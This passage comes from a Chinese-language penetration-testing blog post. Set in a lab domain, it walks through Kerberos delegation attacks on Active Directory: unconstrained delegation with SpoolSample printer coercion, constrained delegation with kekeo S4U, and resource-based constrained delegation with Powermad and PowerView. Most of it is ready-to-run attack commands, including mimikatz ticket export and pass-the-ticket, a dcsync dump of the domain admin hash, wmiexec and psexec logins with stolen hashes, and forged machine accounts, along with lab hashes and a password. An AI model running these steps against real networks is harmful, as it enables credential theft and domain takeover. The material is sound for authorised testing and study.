+<p>答案是肯定的，因为委派攻击，委派的对象只能是入域的机器账户或者是服务账号，而服务账号是域内用户的一种类型，是服务器运行服务时所用的账号，将服务运行起来加入域内。</p>
+<h4 id="利用方式2"><a href="#利用方式2" class="headerlink" title="利用方式2"></a>利用方式2</h4><p>利用打印机漏洞，强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。</p>
+<p><strong>需要3个条件</strong></p>
+<ul>
+<li>机器账户administrator权限</li>
+<li>域用户的账户密码</li>
+<li>域控开启打印机，默认开启</li>
+</ul>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671675532982-92f8c96f-7e16-41c8-a035-a99afd477054.png" alt="img"></p>
+<p>条件1和2，可以理解为，你拿下域内某台机器，登录用户为域用户，然后提权为系统权限。（主要是mimikatz抓密码需要开启debug调试，需要管理员权限）</p>
+<p>工具，<a target="_blank" rel="noopener" href="https://github.com/leechristensen/SpoolSample/">https://github.com/leechristensen/SpoolSample/</a> ，右键重新编译即可。</p>
+<p>需要使用域用户运行SpoolSample,打开一个域用户权限的powershell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">runas /user:test.local\hero powershell</span><br><span class="line">SpoolSample.exe dc web</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671675126996-3f6eb088-56de-4696-8567-785aa4cafa46.png" alt="img"></p>
+<p>然后导出票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; exit</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673099432-2bff5470-10c1-4dea-b798-fc8e1dbc2c31.png" alt="img"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt [0;2530cd]-2-0-60a10000-DC$@krbtgt-TEST.LOCAL.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673244176-02f83ccc-fcaf-483e-b742-ebb1d20a18b6.png" alt="img"></p>
+<p>然后导出hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;lsadump::dcsync /domain:test.local /user:test\Administrator&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671673368143-d4734a9f-c054-4c21-a689-fe6ae381e6de.png" alt="img"></p>
+<p>这里和第一种利用方式不用，第一种方式是因为域控与受控机器建立ipc连接。而第二种利用方式，域控没有与受控机器建立ipc连接。所以这种利用dcsync导出域管的hash，然后利用wmiexec.py远程登录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -hashes :aa647b916a1fad374df9c30711d58a7a test.local/administrator@10.1.20.10 -no-pass -codec gb2312</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671674710152-284609df-060f-4231-94ad-be9cf8602d8a.png" alt="img"></p>
+<h4 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h4><ul>
+<li>在机器账户上拿下管理员权限之后，可以打开一个域用户权限的powershell，前提是知道域用户的密码</li>
+</ul>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">runas /user:test.local\hero powershell</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>完整的攻击思路</li>
+</ul>
+<p>查询域内设置了非约束委派的机器账户，查询域内设置了非约束委派的服务账户，拿下这些机器的权限。然后提权。如果域控与机器账户建立ipc连接，利用攻击方式1直接拿下。或者可以使用攻击方式2拿下，打开一个域用户权限的powershell，然后运行SpoolSample.exe，强迫运行打印服务（Print Spooler）的主机向目标主机发起 Kerberos 或 NTLM 认证请求。mimikatz抓取域管票据，dcsync导出域管hash。</p>
+<h2 id="约束委派"><a href="#约束委派" class="headerlink" title="约束委派"></a>约束委派</h2><p><strong>由于非约束委派的不安全性</strong>，微软在windows2003中发布了约束委派的功能，如下所示</p>
+<p>在约束委派中的kerberos中，用户同样还是会将TGT发送给相关受委派的服务，但是由于S4U2proxy的影响，对发送给受委派的服务去访问其他服务做了限制，<strong>不允许受委派的服务代表用户使用这个TGT去访问任意服务，而是只能访问指定的服务。</strong></p>
+<p>引入了两个新的概念，S4U2Self和S4U2Proxy</p>
+<p><strong>S4U2self</strong></p>
+<p>允许受约束委派的服务代表任意用户向KDC请求服务自身，从而获得一张该用户（任意用户）的对当前受约束委派服务的票据TGS(ST)，该服务票据TGS(ST)包含了用户的相关信息，比如该用户的组信息等。</p>
+<p><strong>S4U2proxy</strong></p>
+<p>允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<p>大概过程：</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671690369631-0108d99a-7895-4094-a1bf-61608e6792f9.png" alt="img"></p>
+<h3 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h3><p>配置约束性委派</p>
+<p><strong>机器账户</strong></p>
+<p>配置一个能进行协议转换的</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692512687-f6e192ae-36b0-4bbf-8900-ebef93223a0c.png" alt="img"></p>
+<p><strong>服务账户</strong></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692612121-703a79fd-8b27-47eb-bca9-4a77920c5be3.png" alt="img"></p>
+<p>因为上面注册了SPN 这里就不注册了 直接使用</p>
+<p>查询机器用户（主机）配置约束委派</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(samAccountType=805306369)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671692916532-8b1c2e49-8d12-4a3a-ab4c-59c7461db985.png" alt="img"></p>
+<p>查询服务账户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -b &quot;DC=test,DC=local&quot; -f &quot;(&amp;(samAccountType=805306368)(msds-allowedtodelegateto=*))&quot; msds-allowedtodelegateto</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671693011657-429ef9c7-97cd-445c-a207-8492ab74f57e.png" alt="img"></p>
+<h4 id="利用方式1-1"><a href="#利用方式1-1" class="headerlink" title="利用方式1"></a>利用方式1</h4><p>条件</p>
+<ul>
+<li>机器账户administrator权限</li>
+<li>获取配置了约束委派的服务账户或者机器账户的凭据(明文密码或者hash都可)</li>
+</ul>
+<p>先拿到WEB的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::tickets /export&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671693632805-607ac41e-0ab5-49f2-a2ee-7ad366c19d47.png" alt="img"></p>
+<p>使用kekeo申请服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:[0;3e7]-2-1-40e10000-WEB$@krbtgt-TEST.LOCAL.kirbi /user:Administrator@test.local /service:cifs/DC.test.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694154247-f5e72d4c-c5f5-4189-965b-785fbcf53477.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694204077-f6df04cc-e422-4089-a330-d53290531d82.png" alt="img"></p>
+<p>可以理解为，先利用S4U2self的特性，获得域管理员访问自身服务的票据，里面包含域管理员的身份信息。再利用S4U2proxy的特性，获取访问DC的cifs服务的票据。</p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@test.local@TEST.LOCAL_cifs~DC.test.local@TEST.LOCAL.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694313146-c4324978-dc41-40d8-9c31-d032c03d311a.png" alt="img"></p>
+<p>导入之后 就能访问了</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671694364379-19aa2f47-c0fd-43af-9b7d-9d76f79d15aa.png" alt="img"></p>
+<h4 id="利用方式2-1"><a href="#利用方式2-1" class="headerlink" title="利用方式2"></a>利用方式2</h4><p>先获取机器账户的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696561511-cb90e6c3-74f2-4637-81ec-fb1fbe86177c.png" alt="img"></p>
+<p>请求票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:WEB$ /domain:test.local /NTLM:4120e9b2b31b411550fa5d114ea82df2&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696684726-9609046a-d78d-4a92-9f9d-198726bdaf23.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696711519-04ac228d-07ab-4f36-a2b0-875faf494221.png" alt="img"></p>
+<p>申请administrator权限的票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgs::s4u /tgt:TGT_WEB$@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi /user:Administrator@test.local /service:cifs/DC.test.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696889277-131e7014-adfb-48c8-8bd6-e901804c7efc.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671696987661-89d83899-136c-44bb-9b7f-a6deead9d875.png" alt="img"></p>
+<p>然后导入票据，就可以访问域控了。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_Administrator@test.local@TEST.LOCAL_cifs~DC.test.local@TEST.LOCAL.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671697134556-c03c0b66-6821-4648-845a-f90daaee94a4.png" alt="img"></p>
+<h4 id="利用方式3"><a href="#利用方式3" class="headerlink" title="利用方式3"></a>利用方式3</h4><p>用机器账户的hash 远程wmiexec登录</p>
+<p>利用之前获取到的hash</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">4120e9b2b31b411550fa5d114ea82df2</span><br></pre></td></tr></table></figure>
+
+<p>用getST申请服务票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.1.20.10 -spn CIFS/DC.test.local -impersonate administrator test.local/WEB$ -hashes :4120e9b2b31b411550fa5d114ea82df2</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698334611-7e9e5a4a-4936-4915-b680-83c672688f30.png" alt="img"></p>
+<p>然后导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache</span><br></pre></td></tr></table></figure>
+
+<p>wimexec 连接</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 wmiexec.py -k test.local/administrator@DC.test.local -no-pass -dc-ip 10.1.20.10 -codec gb2312</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698579737-59546b42-c473-4dc1-b802-cf9ee7bb6532.png" alt="img"></p>
+<p>这里需要注意一点，需要将域名加入到hosts，不然会报错。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">vi /etc/hosts</span><br><span class="line">10.1.20.10    DC.test.local</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671698980582-2ca68e19-5f7c-4acd-aa10-336d6c41bbcb.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699025714-252cbde6-bc36-49ed-8174-e43f4a06ead0.png" alt="img"></p>
+<h4 id="利用方式4"><a href="#利用方式4" class="headerlink" title="利用方式4"></a>利用方式4</h4><p>使用服务账户hero，这里直接用密码，先申请tgt</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;tgt::ask /user:hero /domain:test.local /password:1qaz@WSX /ticket:hero.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699755181-94e2df5b-7541-4e59-a386-0271dfdae733.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699773358-6ddaa538-dfc0-45cc-8262-4b5b33d5ce7b.png" alt="img"></p>
+<p>然后伪造其他用户 申请tgs票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kekeo.exe &quot;Tgs::s4u /tgt:TGT_hero@TEST.LOCAL_krbtgt~test.local@TEST.LOCAL.kirbi /user:administrator@test.local /service:cifs/DC.test.local&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699872781-b6339f1e-1c23-4808-9973-5fcbadd974a5.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671699897261-c8a986dd-6a21-4ffc-8df8-4ea3d34b7eb3.png" alt="img"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mimikatz.exe &quot;kerberos::ptt TGS_administrator@test.local@TEST.LOCAL_cifs~DC.test.local@TEST.LOCAL.kirbi&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671700274299-c3e80e6b-1419-4946-ad0a-e5aefec19aec.png" alt="img"></p>
+<h4 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h4><p>约束委派攻击，引入了S4U2proxy，允许受约束委派的服务通过服务票据ST，然后代表用户去请求指定的服务。</p>
+<p>攻击流程就是：查询机器账户（服务账户）配置的约束委派，然后获取机器账户administrator权限以及获取配置了约束委派的服务账户或者机器账户的凭据(明文密码或者hash都可)。导出票据，可以使用利用方式1进行攻击。获取明文密码，可以使用利用方式4攻击。获取哈希，可以使用利用方式2进行域内攻击，也可以使用利用方式3进行远程攻击，然后wmiexec 连接。</p>
+<h2 id="基于资源的约束性委派"><a href="#基于资源的约束性委派" class="headerlink" title="基于资源的约束性委派"></a>基于资源的约束性委派</h2><p>为了使用户/资源更加独立，Windows Server 2012中引入了基于资源的约束委派。基于资源的约束委派允许资源配置受信任的帐户委派给他们。</p>
+<p>基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员。</p>
+<p>上面”基于资源的约束委派将委派的控制权交给拥有被访问资源的管理员”，这就导致了正常只要是域用户都有权限进行委派操作。</p>
+<p>与约束委派最大的不同点，就是”基于资源”这四个字，如何理解”基于资源”？在设置相关的约束委派的实现的时候不再需要域管理员自己去设置相关约束委派的属性，而操作权落在了当前登录的机器或者用户的手中</p>
+<p><strong>基于资源的约束性委派的优势</strong></p>
+<ul>
+<li>委派的权限授予给了拥有资源的后端，而不再是前端</li>
+<li>约束性委派不能跨域进行委派，基于资源的约束性委派可以跨域和林</li>
+<li>不再需要域管理员权限设置委派，只需拥有在计算机对象上编辑msDS-AllowedToActOnBehaffOtherldentity属性权限，也就是将计算机加入域的域用户和机器自身拥有权限。</li>
+</ul>
+<p><strong>约束性委派和基于资源的约束性委派配置的差别</strong></p>
+<ul>
+<li>传统的约束委派是正向的，通过修改服务A的属性msDS-AlowedToDelegateTo，添加服务B的SPN，设置约束委派对象（服务B)，服务A便可以模拟用户向域控制器请求访问服务B的ST服务票据。</li>
+<li>而基于资源的约束委派则是相反的，通过修改服务B属性msDS-AllowedToActOnBehalfOfotherldentity，添加服务A的SID，达到让服务A模拟用户访问B资源的目的。（让机器账户A模仿域管访问B资源）</li>
+<li>msDS-AllowedToActOnBehalfOfOtherIdentity属性指向委派账户（也就是我们创建的机器账户或已知机器账户）</li>
+</ul>
+<p><strong>条件</strong></p>
+<ol>
+<li>具有对主机修改msDS-AllowedToActOnBehalfOfOtherIdentity属性的权限(如已经控制的主机是WEB1 则具有修改WEB1主机的msDS-AllowedToActOnBehalfOfOtherIdentity的权限账户)</li>
+<li>可以创建机器账户的域用户（或已知机器账户）</li>
+</ol>
+<p><strong>什么用户能够修改msDS-AllowedToActOnBehalfOfOtherIdentity属性：</strong></p>
+<ul>
+<li>将主机加入域的用户(账户中有一个mSDS-CreatorSID属性，用于标记加入域时使用的用户的SID值，反查就可以知道是谁把机器加入域的了)</li>
+<li>Account Operator组成员</li>
+<li>该主机的机器账户</li>
+</ul>
+<p><strong>什么是将机器加入域的域用户？</strong></p>
+<p>因为将一个机器加入域的时候不是要输入一个域用户的账户密码吗 就是输入的这个用户</p>
+<p>如果一个域环境 域用户A 将域内win2012 和 win7 加入了域 我们拿到了域用户A的权限 就可以拿下win2012 和 win7</p>
+<p>如果我们拿到了Account Operators组内用户权限的话，则我们可以拿到除域控外所有机器的system权限。<em>（因为Account Operators组内用户可以修改域内任意主机（除了域控）的<strong>msDS-AllowedToActOnBehalfOfOtherIdentity</strong>属性）</em></p>
+<h3 id="实验-2"><a href="#实验-2" class="headerlink" title="实验"></a>实验</h3><p>使用hero账户将web1添加入域</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671702110983-0171f513-ddeb-4811-958c-44189de6ce3e.png" alt="img"></p>
+<p>查询把web1加入域的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AdFind.exe -h 10.1.20.10 -b &quot;DC=test,DC=local&quot; -f &quot;objectClass=computer&quot; mS-DS-CreatorSID</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671702393664-42c29bc5-a6dc-4b1a-9e93-299292786b67.png" alt="img"></p>
+<p>获取把web1添加入域的用户的sid:S-1-5-21-277698542-1653815282-1203866548-1103</p>
+<p>反查sid，获取sid对应的用户</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sid2user.exe \\10.1.20.10 5 21 277698542 1653815282 1203866548 1103</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671703274094-f482a782-d12f-4d3b-981d-16b4f538c905.png" alt="img"></p>
+<h4 id="利用方式1：基于资源的约束委派攻击本地提权"><a href="#利用方式1：基于资源的约束委派攻击本地提权" class="headerlink" title="利用方式1：基于资源的约束委派攻击本地提权"></a>利用方式1：基于资源的约束委派攻击本地提权</h4><p>如果获取到了hero的权限 就可以用这个用户的权限进行本地提权了</p>
+<ul>
+<li>利用hero域用户创建一个机器账户(每个域用户默认可以创建10个)</li>
+<li>然后修改WEB的msDS-AllowedToActOnBehalfOfOtherIdentity 为新创建的机器用户的sid</li>
+<li>然后利用机器账户申请票据 进行提权</li>
+</ul>
+<p>创建机器账户</p>
+<p>利用Powermad.ps1创建一个test1机器用户 密码123456</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\Powermad.ps1</span><br><span class="line">New-MachineAccount -MachineAccount test1 -Password $(ConvertTo-SecureString &quot;123456&quot; -AsPlainText -Force)</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760081694-be6abb64-9db1-4376-8b7e-6ee341b7edea.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760156107-f600eaee-867e-4e53-bc55-98c2c15b5d56.png" alt="img"></p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760188824-4c4e99ea-bb57-4129-8503-18f74ad8629f.png" alt="img"></p>
+<p>机器账户创建之后,利用powerView查询机器账户的sid(也可手动)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-NetComputer test1 -Properties objectsid</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671760722919-7ac55a15-184b-4ac1-86c7-78dc3031b687.png" alt="img"></p>
+<p>test1 sid：S-1-5-21-277698542-1653815282-1203866548-1107</p>
+<p>设置委派 修改WEB1的msds-allowedtoactonbehalfofotheridentity的值</p>
+<p>利用powerView</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">powershell</span><br><span class="line">Set-ExecutionPolicy Bypass -Scope Process</span><br><span class="line">import-module .\powerview.ps1</span><br><span class="line">$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList &quot;O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;S-1-5-21-277698542-1653815282-1203866548-1107)&quot;</span><br><span class="line">$SDBytes = New-Object byte[] ($SD.BinaryLength)</span><br><span class="line">$SD.GetBinaryForm($SDBytes, 0)</span><br><span class="line">Get-DomainComputer WEB1| Set-DomainObject -Set @&#123;&#x27;msds-allowedtoactonbehalfofotheridentity&#x27;=$SDBytes&#125; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>查询是否修改成功</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainComputer WEB1 -Properties msds-allowedtoactonbehalfofotheridentity</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671761103844-f14ffdce-5222-4c27-b050-c4b1c765276d.png" alt="img"></p>
+<p>清除 msds-allowedtoactonbehalfofotheridentity 属性的值</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Set-DomainObject WEB1 -Clear &#x27;msds-allowedtoactonbehalfofotheridentity&#x27; -Verbose</span><br></pre></td></tr></table></figure>
+
+<p>然后生成票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 getST.py -dc-ip 10.1.20.10 test.local/test1\$:123456 -spn cifs/WEB1.test.local -impersonate administrator</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671761908722-3fcde04e-474a-41f7-b108-8cfac2269788.png" alt="img"></p>
+<p>导入票据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">export KRB5CCNAME=administrator.ccache   </span><br><span class="line"></span><br><span class="line">python3 wmiexec.py WEB1.test.local -no-pass -k -dc-ip 10.1.20.10</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671764379066-a8b1f465-ff95-4989-a534-480586f23883.png" alt="img"></p>
+<p>psexec上去权限更高</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 psexec.py -k test.local/administrator@WEB1.test.local -no-pass</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671763718268-007680fc-f457-44d3-977f-3198d157a939.png" alt="img"></p>
+<h4 id="利用方式2-Acount-Operators组用户拿下主机"><a href="#利用方式2-Acount-Operators组用户拿下主机" class="headerlink" title="利用方式2 Acount Operators组用户拿下主机"></a>利用方式2 Acount Operators组用户拿下主机</h4><p>如果获得Acount Operators组用户就可以获得域内除了域控的所有主机权限</p>
+<p>Acount Operators组成员可以修改域内除了域控其他所有主机的msDS-AllowedToActOnBehalfOfOtherIdentity属性</p>
+<p>这里本地设置一个Acount Operators组用户</p>
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671774718642-073d69ac-e364-4875-b1f9-6c50ac6f3c4b.png" alt="img"></p>
+<p><strong>查询Acount Operators组成员</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adfind.exe -h 10.1.20.10:389 -s subtree -b CN=&quot;Account Operators&quot;,CN=Builtin,DC=test,DC=local member</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://ax-x.github.io/2023/04/19/%E5%A7%94%E6%B4%BE%E6%94%BB%E5%87%BB/1671774874760-1c9cb69a-ffcf-4192-baf8-70d6a8b45172.png" alt="img"></p>
+<p>操作一样</p>
+<p>先创建机器账户</p>
